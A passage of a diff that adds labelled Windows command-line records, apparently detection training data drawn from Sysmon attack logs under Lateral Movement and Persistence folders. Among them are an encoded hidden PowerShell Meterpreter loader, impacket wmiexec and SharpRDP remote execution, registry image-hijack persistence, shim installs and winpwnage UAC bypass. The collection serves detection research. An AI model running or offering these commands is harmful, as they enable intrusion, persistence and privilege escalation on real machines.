IO.MemoryStream(,[Convert]::FromBase64String(''H4sIAIuvyFwCA7VW+2/aSBD+OZH6P1gVErZCMA60aSJVujVPE5xADITHodNir+0lay/Ya169/u83Btym1/SuPeksHruzM7Mz33w7azcJbUF5KM2DxU1J+vTm/KyLIxxIco6MClKOmsrZGQhz5Er6KMlTtFzWeIBpOLu9rSZRREJxnBebRKA4JsGcURLLivSn9OSTiFw+zBfEFtInKfdHscn4HLOT2q6KbZ9Ilyh00rUOt3EaSdFaMirk/O+/55XppTYr1lcJZrGct3axIEHRYSyvSJ+VdMP+bknkvEntiMfcFcUnGpavioMwxi65B29rYhLhcyfOK5ADfCIikiiUIJvU/Lgo52HYjbiNHCcicZwvSNPU8XQ2+02ennZ9TEJBA1I0QkEivrRItKY2iYstHDqMPBJ3BlaWiGjozRQF1Nb8mci5MGGsIP2KG/mebDLMftZIfmkEWl0RKYW0gn/P0uROwsjRLv9KmFBzBZ5j3QGyz2/O35y7GUVWdyP6kiEwOpsexgQCk7s8pge9j1KpIJmwCRY82sE0148Sosy+wCrl3Gbhx9ZapgqKfP+0BdF0yKkzA5NTHXMbkUp/zMYacWlIarsQB9TOCCe/Bi5xGTnkV8zU7iEkOX9aIE6NMOJhkQKW1vg7s3pAxRdbPaHMIRGyoUAxRAW1U74N5lgDOW+EJgkAn+McSJdzgeYk0z5Re5ftns5BKV9lOI4LUjeBc2YXJItgRpyChMKYnpZQIvhhmP8arpkwQW0ci8zdTDmieNqtysNYRIkNBYPM+9aS2BSzFIiC1KIO0XcW9bJd86/CUMWMAfvB0xrKAJI0fUukNIicNLumUrSIMIIlIwFoHA57g2EPjvaJ4QfWYI84+W+jyxh8pGuKQpb+i9igtBbjoiANaSSgY6SIpuz5L1u/6BQQRDUipwLI2ZmY6juRMjm3H6c8PKFxyD0SkHcj4oGOY/K+cuwJ8lv1gVYRPGMjZKatP1MNbahmmPAd0LLBa9fOXXvRUqPa1neRERtmq1vrtVqVddsaVoRVN8Rd1xBmfbRYWKj1OBiLiYFafVp6Hlf2yzbdWx3kjLfq+72+35T07X7hOe645rretWs9au8atPNU7emlK9yp1ZPOk77RS5W4TjetHh30ntsNMR8PGR64qjfSbjDddqLFUOPm3kCo6ZftfdsdNn3T2Y1blCzUUof2UA+hO/txMGh6S68ZI/VmuKoG3h1CRh8jA9WHu/Y7pvcGDR0N6noPP/Bu+aKmahNnVW9MRrgdMKfZUrXxCDkoUvuer10/+GGKE/b0lZ7qoM5k11BBp1tBrcoV3U9WvaaH6qAzDDjCDfo8uBiBz/s+2DwNNIcjERojVR16qodcyx9jpIO2vkINnVd3H7pmVx0Or3xt/qz5EDMZrT+YbXTRsLuqql4Ec/hVkW0ut+FI31yvvZbF7/AdHq4nZVXrb5ouWqGLC13T56JVL7fXsG9fvRl8fJtyB8iTc/f+5AUvftTATRzFPmbAF+jN2cls8Khx6rhdTlMLWT5ezs8kCgmDCw6uwIzliDFup83+0Jzhojm2//Q2GsCwfPXqSJG+KCpfr4FMdHs7gTDh3OzHxQ4JPeEXSttyqQRdvbStlCDJn0+sypc7GRwV0jvhgMvRLzv4VdKzlPMfh1Hlf4brdIZ9+HP+Da6vsn9Y/SkIS4Vjyt+JvxX8EqK/nvsTpgJULehDjBxvv9chOJHjxYvBoTRQfff0pK91D4m4vIcXhjfnfwFhhx3MPQoAAA==''))),[IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);\"",
+    "label": 1,
+    "source": "LM_sysmon_psexec_smb_meterpreter.evtx",
+    "folder": "Lateral Movement"
+  },
+  {
+    "command": "\"powershell.exe\" -noni -nop -w hidden -c &([scriptblock]::create((New-Object IO.StreamReader(New-Object IO.Compression.GzipStream((New-Object IO.MemoryStream(,[Convert]::FromBase64String('H4sIAIuvyFwCA7VW+2/aSBD+OZH6P1gVErZCMA60aSJVujVPE5xADITHodNir+0lay/Ya169/u83Btym1/SuPeksHruzM7Mz33w7azcJbUF5KM2DxU1J+vTm/KyLIxxIco6MClKOmsrZGQhz5Er6KMlTtFzWeIBpOLu9rSZRREJxnBebRKA4JsGcURLLivSn9OSTiFw+zBfEFtInKfdHscn4HLOT2q6KbZ9Ilyh00rUOt3EaSdFaMirk/O+/55XppTYr1lcJZrGct3axIEHRYSyvSJ+VdMP+bknkvEntiMfcFcUnGpavioMwxi65B29rYhLhcyfOK5ADfCIikiiUIJvU/Lgo52HYjbiNHCcicZwvSNPU8XQ2+02ennZ9TEJBA1I0QkEivrRItKY2iYstHDqMPBJ3BlaWiGjozRQF1Nb8mci5MGGsIP2KG/mebDLMftZIfmkEWl0RKYW0gn/P0uROwsjRLv9KmFBzBZ5j3QGyz2/O35y7GUVWdyP6kiEwOpsexgQCk7s8pge9j1KpIJmwCRY82sE0148Sosy+wCrl3Gbhx9ZapgqKfP+0BdF0yKkzA5NTHXMbkUp/zMYacWlIarsQB9TOCCe/Bi5xGTnkV8zU7iEkOX9aIE6NMOJhkQKW1vg7s3pAxRdbPaHMIRGyoUAxRAW1U74N5lgDOW+EJgkAn+McSJdzgeYk0z5Re5ftns5BKV9lOI4LUjeBc2YXJItgRpyChMKYnpZQIvhhmP8arpkwQW0ci8zdTDmieNqtysNYRIkNBYPM+9aS2BSzFIiC1KIO0XcW9bJd86/CUMWMAfvB0xrKAJI0fUukNIicNLumUrSIMIIlIwFoHA57g2EPjvaJ4QfWYI84+W+jyxh8pGuKQpb+i9igtBbjoiANaSSgY6SIpuz5L1u/6BQQRDUipwLI2ZmY6juRMjm3H6c8PKFxyD0SkHcj4oGOY/K+cuwJ8lv1gVYRPGMjZKatP1MNbahmmPAd0LLBa9fOXXvRUqPa1neRERtmq1vrtVqVddsaVoRVN8Rd1xBmfbRYWKj1OBiLiYFafVp6Hlf2yzbdWx3kjLfq+72+35T07X7hOe645rretWs9au8atPNU7emlK9yp1ZPOk77RS5W4TjetHh30ntsNMR8PGR64qjfSbjDddqLFUOPm3kCo6ZftfdsdNn3T2Y1blCzUUof2UA+hO/txMGh6S68ZI/VmuKoG3h1CRh8jA9WHu/Y7pvcGDR0N6noPP/Bu+aKmahNnVW9MRrgdMKfZUrXxCDkoUvuer10/+GGKE/b0lZ7qoM5k11BBp1tBrcoV3U9WvaaH6qAzDDjCDfo8uBiBz/s+2DwNNIcjERojVR16qodcyx9jpIO2vkINnVd3H7pmVx0Or3xt/qz5EDMZrT+YbXTRsLuqql4Ec/hVkW0ut+FI31yvvZbF7/AdHq4nZVXrb5ouWqGLC13T56JVL7fXsG9fvRl8fJtyB8iTc/f+5AUvftTATRzFPmbAF+jN2cls8Khx6rhdTlMLWT5ezs8kCgmDCw6uwIzliDFup83+0Jzhojm2//Q2GsCwfPXqSJG+KCpfr4FMdHs7gTDh3OzHxQ4JPeEXSttyqQRdvbStlCDJn0+sypc7GRwV0jvhgMvRLzv4VdKzlPMfh1Hlf4brdIZ9+HP+Da6vsn9Y/SkIS4Vjyt+JvxX8EqK/nvsTpgJULehDjBxvv9chOJHjxYvBoTRQfff0pK91D4m4vIcXhjfnfwFhhx3MPQoAAA=='))),[IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))",
+    "label": 1,
+    "source": "LM_sysmon_psexec_smb_meterpreter.evtx",
+    "folder": "Lateral Movement"
+  },
+  {
+    "command": "\"c:\\windows\\system32\\cmd.exe\" /c net user",
+    "label": 1,
+    "source": "LM_typical_IIS_webshell_sysmon_1_10_traces.evtx",
+    "folder": "Lateral Movement"
+  },
+  {
+    "command": "net  user",
+    "label": 1,
+    "source": "LM_typical_IIS_webshell_sysmon_1_10_traces.evtx",
+    "folder": "Lateral Movement"
+  },
+  {
+    "command": "C:\\Windows\\system32\\net1  user",
+    "label": 1,
+    "source": "LM_typical_IIS_webshell_sysmon_1_10_traces.evtx",
+    "folder": "Lateral Movement"
+  },
+  {
+    "command": "C:\\Windows\\system32\\WinrsHost.exe -Embedding",
+    "label": 1,
+    "source": "LM_winrm_exec_sysmon_1_winrshost.evtx",
+    "folder": "Lateral Movement"
+  },
+  {
+    "command": "C:\\Windows\\system32\\cmd.exe /C ipconfig",
+    "label": 1,
+    "source": "LM_winrm_exec_sysmon_1_winrshost.evtx",
+    "folder": "Lateral Movement"
+  },
+  {
+    "command": "ipconfig",
+    "label": 1,
+    "source": "LM_winrm_exec_sysmon_1_winrshost.evtx",
+    "folder": "Lateral Movement"
+  },
+  {
+    "command": "cmd.exe /Q /c cd \\ 1> \\\\127.0.0.1\\ADMIN$\\__1556656369.7 2>&1",
+    "label": 1,
+    "source": "LM_wmiexec_impacket_sysmon_whoami.evtx",
+    "folder": "Lateral Movement"
+  },
+  {
+    "command": "cmd.exe /Q /c cd  1> \\\\127.0.0.1\\ADMIN$\\__1556656369.7 2>&1",
+    "label": 1,
+    "source": "LM_wmiexec_impacket_sysmon_whoami.evtx",
+    "folder": "Lateral Movement"
+  },
+  {
+    "command": "cmd.exe /Q /c whoami /all 1> \\\\127.0.0.1\\ADMIN$\\__1556656369.7 2>&1",
+    "label": 1,
+    "source": "LM_wmiexec_impacket_sysmon_whoami.evtx",
+    "folder": "Lateral Movement"
+  },
+  {
+    "command": "rundll32 url.dll,FileProtocolHandler ms-browser://",
+    "label": 1,
+    "source": "LM_wmi_PoisonHandler_Mr-Un1k0d3r_sysmon_1_13.evtx",
+    "folder": "Lateral Movement"
+  },
+  {
+    "command": "\"cmd.exe\" /c notepad.exe",
+    "label": 1,
+    "source": "LM_wmi_PoisonHandler_Mr-Un1k0d3r_sysmon_1_13.evtx",
+    "folder": "Lateral Movement"
+  },
+  {
+    "command": "notepad.exe",
+    "label": 1,
+    "source": "LM_wmi_PoisonHandler_Mr-Un1k0d3r_sysmon_1_13.evtx",
+    "folder": "Lateral Movement"
+  },
+  {
+    "command": "rundll32 url.dll,OpenURL ms-browser://",
+    "label": 1,
+    "source": "LM_wmi_PoisonHandler_Mr-Un1k0d3r_sysmon_1_13.evtx",
+    "folder": "Lateral Movement"
+  },
+  {
+    "command": "cmd.exe /c start ms-browser://",
+    "label": 1,
+    "source": "LM_wmi_PoisonHandler_Mr-Un1k0d3r_sysmon_1_13.evtx",
+    "folder": "Lateral Movement"
+  },
+  {
+    "command": "explorer ms-browser://",
+    "label": 1,
+    "source": "LM_wmi_PoisonHandler_Mr-Un1k0d3r_sysmon_1_13.evtx",
+    "folder": "Lateral Movement"
+  },
+  {
+    "command": "\"C:\\Windows\\system32\\NETSTAT.EXE\"  -na",
+    "label": 1,
+    "source": "powercat_revShell_sysmon_1_3.evtx",
+    "folder": "Lateral Movement"
+  },
+  {
+    "command": "\"cmd\"",
+    "label": 1,
+    "source": "powercat_revShell_sysmon_1_3.evtx",
+    "folder": "Lateral Movement"
+  },
+  {
+    "command": "systeminfo",
+    "label": 1,
+    "source": "powercat_revShell_sysmon_1_3.evtx",
+    "folder": "Lateral Movement"
+  },
+  {
+    "command": "C:\\WINDOWS\\PSEXESVC.exe",
+    "label": 1,
+    "source": "remote_file_copy_system_proc_file_write_sysmon_11.evtx",
+    "folder": "Lateral Movement"
+  },
+  {
+    "command": "SharpRDP.exe  computername=192.168.56.1 command=\"C:\\Temp\\file.exe\" username=domain\\user password=password",
+    "label": 1,
+    "source": "sharprdp_sysmon_7_mstscax.dll.evtx",
+    "folder": "Lateral Movement"
+  },
+  {
+    "command": "cmd.exe /Q /c cd \\ 1> \\\\127.0.0.1\\C$\\WqEVwJZYOe 2>&1",
+    "label": 1,
+    "source": "smbmap_upload_exec_sysmon.evtx",
+    "folder": "Lateral Movement"
+  },
+  {
+    "command": "cmd.exe /Q /c cd  1> \\\\127.0.0.1\\C$\\WqEVwJZYOe 2>&1",
+    "label": 1,
+    "source": "smbmap_upload_exec_sysmon.evtx",
+    "folder": "Lateral Movement"
+  },
+  {
+    "command": "cmd.exe /Q /c c:\\windows\\system32\\rundll32.exe c:\\programdata\\7okjer,#1 1> \\\\127.0.0.1\\C$\\WqEVwJZYOe 2>&1",
+    "label": 1,
+    "source": "smbmap_upload_exec_sysmon.evtx",
+    "folder": "Lateral Movement"
+  },
+  {
+    "command": "\"C:\\Windows\\system32\\cmd.exe\" /c set > c:\\users\\\\public\\netstat.txt",
+    "label": 1,
+    "source": "sysmon_1_exec_via_sql_xpcmdshell.evtx",
+    "folder": "Lateral Movement"
+  },
+  {
+    "command": "C:\\Windows\\system32\\wbem\\wmiprvse.exe -secured -Embedding",
+    "label": 1,
+    "source": "wmi_remote_registry_sysmon.evtx",
+    "folder": "Lateral Movement"
+  },
+  {
+    "command": "reg  add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\notepad.exe\" /v GlobalFlag /t REG_DWORD /d 512",
+    "label": 1,
+    "source": "persistence_SilentProcessExit_ImageHijack_sysmon_13_1.evtx",
+    "folder": "Persistence"
+  },
+  {
+    "command": "reg  add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\notepad.exe\" /v ReportingMode /t REG_DWORD /d 1",
+    "label": 1,
+    "source": "persistence_SilentProcessExit_ImageHijack_sysmon_13_1.evtx",
+    "folder": "Persistence"
+  },
+  {
+    "command": "reg  add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\notepad.exe\" /v MonitorProcess /d \"C:\\windows\\temp\\evil.exe\"",
+    "label": 1,
+    "source": "persistence_SilentProcessExit_ImageHijack_sysmon_13_1.evtx",
+    "folder": "Persistence"
+  },
+  {
+    "command": "C:\\windows\\temp\\evil.exe",
+    "label": 1,
+    "source": "persistence_SilentProcessExit_ImageHijack_sysmon_13_1.evtx",
+    "folder": "Persistence"
+  },
+  {
+    "command": "C:\\Windows\\system32\\Macromed\\Flash\\FlashPlayerUpdateService.exe",
+    "label": 1,
+    "source": "persistence_SilentProcessExit_ImageHijack_sysmon_13_1.evtx",
+    "folder": "Persistence"
+  },
+  {
+    "command": "C:\\Windows\\system32\\Macromed\\Flash\\FlashUtil32_30_0_0_134_Plugin.exe -check plugin",
+    "label": 1,
+    "source": "persistence_SilentProcessExit_ImageHijack_sysmon_13_1.evtx",
+    "folder": "Persistence"
+  },
+  {
+    "command": "utilman.exe /debug",
+    "label": 1,
+    "source": "persistence_sysmon_11_13_1_shime_appfix.evtx",
+    "folder": "Persistence"
+  },
+  {
+    "command": "UI0Detect.exe 224",
+    "label": 1,
+    "source": "persistence_sysmon_11_13_1_shime_appfix.evtx",
+    "folder": "Persistence"
+  },
+  {
+    "command": "\"LogonUI.exe\" /flags:0x0",
+    "label": 1,
+    "source": "persistence_sysmon_11_13_1_shime_appfix.evtx",
+    "folder": "Persistence"
+  },
+  {
+    "command": "C:\\Windows\\system32\\cmd.EXE /c malwr.vbs",
+    "label": 1,
+    "source": "persistence_sysmon_11_13_1_shime_appfix.evtx",
+    "folder": "Persistence"
+  },
+  {
+    "command": "gpscript.exe /Logoff",
+    "label": 1,
+    "source": "persistence_sysmon_11_13_1_shime_appfix.evtx",
+    "folder": "Persistence"
+  },
+  {
+    "command": "\"LogonUI.exe\" /flags:0x1",
+    "label": 1,
+    "source": "persistence_sysmon_11_13_1_shime_appfix.evtx",
+    "folder": "Persistence"
+  },
+  {
+    "command": "taskhost.exe C:\\Windows\\system32\\CompatTelRunner.exe",
+    "label": 1,
+    "source": "persistence_sysmon_11_13_1_shime_appfix.evtx",
+    "folder": "Persistence"
+  },
+  {
+    "command": "\\SystemRoot\\System32\\smss.exe 00000000 0000003c",
+    "label": 1,
+    "source": "persistence_sysmon_11_13_1_shime_appfix.evtx",
+    "folder": "Persistence"
+  },
+  {
+    "command": "%%SystemRoot%%\\system32\\csrss.exe ObjectDirectory=\\Windows SharedSection=1024,12288,512 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=winsrv:ConServerDllInitialization,2 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16",
+    "label": 1,
+    "source": "persistence_sysmon_11_13_1_shime_appfix.evtx",
+    "folder": "Persistence"
+  },
+  {
+    "command": "\\SystemRoot\\System32\\smss.exe 00000001 0000003c",
+    "label": 1,
+    "source": "persistence_sysmon_11_13_1_shime_appfix.evtx",
+    "folder": "Persistence"
+  },
+  {
+    "command": "wininit.exe",
+    "label": 1,
+    "source": "persistence_sysmon_11_13_1_shime_appfix.evtx",
+    "folder": "Persistence"
+  },
+  {
+    "command": "C:\\Windows\\system32\\services.exe",
+    "label": 1,
+    "source": "persistence_sysmon_11_13_1_shime_appfix.evtx",
+    "folder": "Persistence"
+  },
+  {
+    "command": "C:\\Windows\\system32\\lsm.exe",
+    "label": 1,
+    "source": "persistence_sysmon_11_13_1_shime_appfix.evtx",
+    "folder": "Persistence"
+  },
+  {
+    "command": "winlogon.exe",
+    "label": 1,
+    "source": "persistence_sysmon_11_13_1_shime_appfix.evtx",
+    "folder": "Persistence"
+  },
+  {
+    "command": "C:\\Windows\\system32\\svchost.exe -k DcomLaunch",
+    "label": 1,
+    "source": "persistence_sysmon_11_13_1_shime_appfix.evtx",
+    "folder": "Persistence"
+  },
+  {
+    "command": "C:\\Windows\\System32\\VBoxService.exe",
+    "label": 1,
+    "source": "persistence_sysmon_11_13_1_shime_appfix.evtx",
+    "folder": "Persistence"
+  },
+  {
+    "command": "C:\\Windows\\system32\\svchost.exe -k LocalService",
+    "label": 1,
+    "source": "persistence_sysmon_11_13_1_shime_appfix.evtx",
+    "folder": "Persistence"
+  },
+  {
+    "command": "C:\\Windows\\system32\\svchost.exe -k GPSvcGroup",
+    "label": 1,
+    "source": "persistence_sysmon_11_13_1_shime_appfix.evtx",
+    "folder": "Persistence"
+  },
+  {
+    "command": "C:\\Windows\\System32\\spoolsv.exe",
+    "label": 1,
+    "source": "persistence_sysmon_11_13_1_shime_appfix.evtx",
+    "folder": "Persistence"
+  },
+  {
+    "command": "gpscript.exe /Startup",
+    "label": 1,
+    "source": "persistence_sysmon_11_13_1_shime_appfix.evtx",
+    "folder": "Persistence"
+  },
+  {
+    "command": "\"C:\\Program Files\\freeSSHd\\FreeSSHDService.exe\"",
+    "label": 1,
+    "source": "persistence_sysmon_11_13_1_shime_appfix.evtx",
+    "folder": "Persistence"
+  },
+  {
+    "command": "taskhost.exe $(Arg0)",
+    "label": 1,
+    "source": "persistence_sysmon_11_13_1_shime_appfix.evtx",
+    "folder": "Persistence"
+  },
+  {
+    "command": "C:\\Windows\\system32\\wlms\\wlms.exe",
+    "label": 1,
+    "source": "persistence_sysmon_11_13_1_shime_appfix.evtx",
+    "folder": "Persistence"
+  },
+  {
+    "command": "C:\\Windows\\system32\\UI0Detect.exe",
+    "label": 1,
+    "source": "persistence_sysmon_11_13_1_shime_appfix.evtx",
+    "folder": "Persistence"
+  },
+  {
+    "command": "taskhost.exe SYSTEM",
+    "label": 1,
+    "source": "persistence_sysmon_11_13_1_shime_appfix.evtx",
+    "folder": "Persistence"
+  },
+  {
+    "command": "\"taskhost.exe\"",
+    "label": 1,
+    "source": "persistence_sysmon_11_13_1_shime_appfix.evtx",
+    "folder": "Persistence"
+  },
+  {
+    "command": "atbroker.exe",
+    "label": 1,
+    "source": "persistence_sysmon_11_13_1_shime_appfix.evtx",
+    "folder": "Persistence"
+  },
+  {
+    "command": "\"C:\\Windows\\system32\\slui.exe\"",
+    "label": 1,
+    "source": "persistence_sysmon_11_13_1_shime_appfix.evtx",
+    "folder": "Persistence"
+  },
+  {
+    "command": "gpscript.exe /Logon",
+    "label": 1,
+    "source": "persistence_sysmon_11_13_1_shime_appfix.evtx",
+    "folder": "Persistence"
+  },
+  {
+    "command": "C:\\Windows\\system32\\userinit.exe",
+    "label": 1,
+    "source": "persistence_sysmon_11_13_1_shime_appfix.evtx",
+    "folder": "Persistence"
+  },
+  {
+    "command": "\"C:\\Windows\\System32\\cmd.exe\" /c msg *  \"hello from run key\"",
+    "label": 1,
+    "source": "persistence_sysmon_11_13_1_shime_appfix.evtx",
+    "folder": "Persistence"
+  },
+  {
+    "command": "\"C:\\Windows\\PSEXESVC.exe\"",
+    "label": 1,
+    "source": "persistence_sysmon_11_13_1_shime_appfix.evtx",
+    "folder": "Persistence"
+  },
+  {
+    "command": "msg  *  \"hello from run key\"",
+    "label": 1,
+    "source": "persistence_sysmon_11_13_1_shime_appfix.evtx",
+    "folder": "Persistence"
+  },
+  {
+    "command": "\"C:\\Program Files\\Windows Media Player\\wmpnetwk.exe\"",
+    "label": 1,
+    "source": "persistence_sysmon_11_13_1_shime_appfix.evtx",
+    "folder": "Persistence"
+  },
+  {
+    "command": "\"C:\\Program Files\\Microsoft Application Compatibility Toolkit\\Compatibility Administrator (32-bit)\\Compatadmin.exe\"",
+    "label": 1,
+    "source": "persistence_sysmon_11_13_1_shime_appfix.evtx",
+    "folder": "Persistence"
+  },
+  {
+    "command": "\"C:\\Windows\\system32\\sdbinst.exe\" -q \"C:\\Windows\\AppPatch\\Test.SDB  \"",
+    "label": 1,
+    "source": "persistence_sysmon_11_13_1_shime_appfix.evtx",
+    "folder": "Persistence"
+  },
+  {
+    "command": "\"C:\\Windows\\system32\\sdbinst.exe\" -q -u \"C:\\Windows\\AppPatch\\Test.SDB  \"",
+    "label": 1,
+    "source": "persistence_sysmon_11_13_1_shime_appfix.evtx",
+    "folder": "Persistence"
+  },
+  {
+    "command": "\"C:\\Windows\\system32\\sdbinst.exe\" -q \"C:\\Users\\user01\\Desktop\\titi.sdb\"",
+    "label": 1,
+    "source": "persistence_sysmon_11_13_1_shime_appfix.evtx",
+    "folder": "Persistence"
+  },
+  {
+    "command": "\"c:\\osk.exe\"",
+    "label": 1,
+    "source": "persistence_sysmon_11_13_1_shime_appfix.evtx",
+    "folder": "Persistence"
+  },
+  {
+    "command": "C:\\Windows\\System32\\wsqmcons.exe",
+    "label": 1,
+    "source": "persistence_sysmon_11_13_1_shime_appfix.evtx",
+    "folder": "Persistence"
+  },
+  {
+    "command": "C:\\Windows\\system32\\schtasks.exe /delete /f /TN \"Microsoft\\Windows\\Customer Experience Improvement Program\\Uploader\"",
+    "label": 1,
+    "source": "persistence_sysmon_11_13_1_shime_appfix.evtx",
+    "folder": "Persistence"
+  },
+  {
+    "command": "\"C:\\Windows\\system32\\rundll32.exe\" C:\\Windows\\system32\\shell32.dll,OpenAs_RunDLL C:\\Windows\\AppPatch\\Custom\\{3ad6ed23-adf8-4bc1-a898-4d695f482c64}.sdb",
+    "label": 1,
+    "source": "persistence_sysmon_11_13_1_shime_appfix.evtx",
+    "folder": "Persistence"
+  },
+  {
+    "command": "\"C:\\Program Files\\Windows NT\\Accessories\\WORDPAD.EXE\" \"C:\\Windows\\AppPatch\\Custom\\{3ad6ed23-adf8-4bc1-a898-4d695f482c64}.sdb\"",
+    "label": 1,
+    "source": "persistence_sysmon_11_13_1_shime_appfix.evtx",
+    "folder": "Persistence"
+  },
+  {
+    "command": "C:\\Windows\\servicing\\TrustedInstaller.exe",
+    "label": 1,
+    "source": "persistence_sysmon_11_13_1_shime_appfix.evtx",
+    "folder": "Persistence"
+  },
+  {
+    "command": "\"C:\\Users\\IEUser\\Downloads\\com-hijack.exe\"",
+    "label": 1,
+    "source": "persist_firefox_comhijack_sysmon_11_13_7_1.evtx",
+    "folder": "Persistence"
+  },
+  {
+    "command": "C:\\Windows\\system32\\cmd.exe /c test.bat",
+    "label": 1,
+    "source": "persist_firefox_comhijack_sysmon_11_13_7_1.evtx",
+    "folder": "Persistence"
+  },
+  {
+    "command": "C:\\Windows\\system32\\cmd.exe /c pause",
+    "label": 1,
+    "source": "persist_firefox_comhijack_sysmon_11_13_7_1.evtx",
+    "folder": "Persistence"
+  },
+  {
+    "command": "\"C:\\Program Files\\Mozilla Firefox\\firefox.exe\"",
+    "label": 1,
+    "source": "persist_firefox_comhijack_sysmon_11_13_7_1.evtx",
+    "folder": "Persistence"
+  },
+  {
+    "command": "\"C:\\Program Files\\Mozilla Firefox\\firefox.exe\" -contentproc --channel=\"3168.0.153744822\\2027949517\" -parentBuildID 20190507012018 -greomni \"C:\\Program Files\\Mozilla Firefox\\omni.ja\" -appomni \"C:\\Program Files\\Mozilla Firefox\\browser\\omni.ja\" -appdir \"C:\\Program Files\\Mozilla Firefox\\browser\" - 3168 \"\\\\.\\pipe\\gecko-crash-server-pipe.3168\" 956 gpu",
+    "label": 1,
+    "source": "persist_firefox_comhijack_sysmon_11_13_7_1.evtx",
+    "folder": "Persistence"
+  },
+  {
+    "command": "\"C:\\Program Files\\Mozilla Firefox\\firefox.exe\" -contentproc --channel=\"3168.6.1176946839\\1268428683\" -childID 1 -isForBrowser -prefsHandle 1844 -prefMapHandle 1836 -prefsLen 1 -prefMapSize 183351 -parentBuildID 20190507012018 -greomni \"C:\\Program Files\\Mozilla Firefox\\omni.ja\" -appomni \"C:\\Program Files\\Mozilla Firefox\\browser\\omni.ja\" -appdir \"C:\\Program Files\\Mozilla Firefox\\browser\" - 3168 \"\\\\.\\pipe\\gecko-crash-server-pipe.3168\" 1680 tab",
+    "label": 1,
+    "source": "persist_firefox_comhijack_sysmon_11_13_7_1.evtx",
+    "folder": "Persistence"
+  },
+  {
+    "command": "\"C:\\Program Files\\Mozilla Firefox\\firefox.exe\" -contentproc --channel=\"3168.13.1464597065\\1561502721\" -childID 2 -isForBrowser -prefsHandle 2432 -prefMapHandle 2436 -prefsLen 5401 -prefMapSize 183351 -parentBuildID 20190507012018 -greomni \"C:\\Program Files\\Mozilla Firefox\\omni.ja\" -appomni \"C:\\Program Files\\Mozilla Firefox\\browser\\omni.ja\" -appdir \"C:\\Program Files\\Mozilla Firefox\\browser\" - 3168 \"\\\\.\\pipe\\gecko-crash-server-pipe.3168\" 2448 tab",
+    "label": 1,
+    "source": "persist_firefox_comhijack_sysmon_11_13_7_1.evtx",
+    "folder": "Persistence"
+  },
+  {
+    "command": "\"C:\\Program Files\\Mozilla Firefox\\firefox.exe\" -contentproc --channel=\"3168.20.1502540827\\1989220046\" -childID 3 -isForBrowser -prefsHandle 3032 -prefMapHandle 3056 -prefsLen 6207 -prefMapSize 183351 -parentBuildID 20190507012018 -greomni \"C:\\Program Files\\Mozilla Firefox\\omni.ja\" -appomni \"C:\\Program Files\\Mozilla Firefox\\browser\\omni.ja\" -appdir \"C:\\Program Files\\Mozilla Firefox\\browser\" - 3168 \"\\\\.\\pipe\\gecko-crash-server-pipe.3168\" 3024 tab",
+    "label": 1,
+    "source": "persist_firefox_comhijack_sysmon_11_13_7_1.evtx",
+    "folder": "Persistence"
+  },
+  {
+    "command": "\"C:\\Users\\IEUser\\Downloads\\a.exe\"",
+    "label": 1,
+    "source": "sysmon_13_1_persistence_via_winlogon_shell.evtx",
+    "folder": "Persistence"
+  },
+  {
+    "command": "\"C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\vbc.exe\" /stext \"C:\\Users\\IEUser\\AppData\\Local\\Temp\\tmpA185.tmp\"",
+    "label": 1,
+    "source": "sysmon_13_1_persistence_via_winlogon_shell.evtx",
+    "folder": "Persistence"
+  },
+  {
+    "command": "\\SystemRoot\\System32\\smss.exe 00000000 00000040",
+    "label": 1,
+    "source": "sysmon_13_1_persistence_via_winlogon_shell.evtx",
+    "folder": "Persistence"
+  },
+  {
+    "command": "C:\\Windows\\system32\\DllHost.exe /Processid:{E10F6C3A-F1AE-4ADC-AA9D-2FE65525666E}",
+    "label": 1,
+    "source": "sysmon_13_1_persistence_via_winlogon_shell.evtx",
+    "folder": "Persistence"
+  },
+  {
+    "command": "efsui.exe /efs /keybackup",
+    "label": 1,
+    "source": "sysmon_13_1_persistence_via_winlogon_shell.evtx",
+    "folder": "Persistence"
+  },
+  {
+    "command": "\"C:\\Users\\IEUser\\AppData\\Roaming\\9QxTsAU9w8gyPj4w\\BRE6BgE2JubB.exe\"",
+    "label": 1,
+    "source": "sysmon_13_1_persistence_via_winlogon_shell.evtx",
+    "folder": "Persistence"
+  },
+  {
+    "command": "\"C:\\Windows\\System32\\VBoxTray.exe\"",
+    "label": 1,
+    "source": "sysmon_13_1_persistence_via_winlogon_shell.evtx",
+    "folder": "Persistence"
+  },
+  {
+    "command": "\"C:\\Windows\\system32\\eventvwr.exe\"",
+    "label": 1,
+    "source": "sysmon_13_1_persistence_via_winlogon_shell.evtx",
+    "folder": "Persistence"
+  },
+  {
+    "command": "\"C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\vbc.exe\" /stext \"C:\\Users\\IEUser\\AppData\\Local\\Temp\\tmp7792.tmp\"",
+    "label": 1,
+    "source": "sysmon_13_1_persistence_via_winlogon_shell.evtx",
+    "folder": "Persistence"
+  },
+  {
+    "command": "C:\\Windows\\System32\\mobsync.exe -Embedding",
+    "label": 1,
+    "source": "sysmon_1_persist_bitsjob_SetNotifyCmdLine.evtx",
+    "folder": "Persistence"
+  },
+  {
+    "command": "/c notepad.exe",
+    "label": 1,
+    "source": "sysmon_1_persist_bitsjob_SetNotifyCmdLine.evtx",
+    "folder": "Persistence"
+  },
+  {
+    "command": "python  winpwnage.py -u elevate -5 -p c:\\Windows\\System32\\cmd.exe",
+    "label": 1,
+    "source": "sysmon_20_21_1_CommandLineEventConsumer.evtx",
+    "folder": "Persistence"
+  },
+  {
+    "command": "python  winpwnage.py -u elevate -i 5 -p c:\\Windows\\System32\\cmd.exe",
+    "label": 1,
+    "source": "sysmon_20_21_1_CommandLineEventConsumer.evtx",
+    "folder": "Persistence"
+  },
+  {
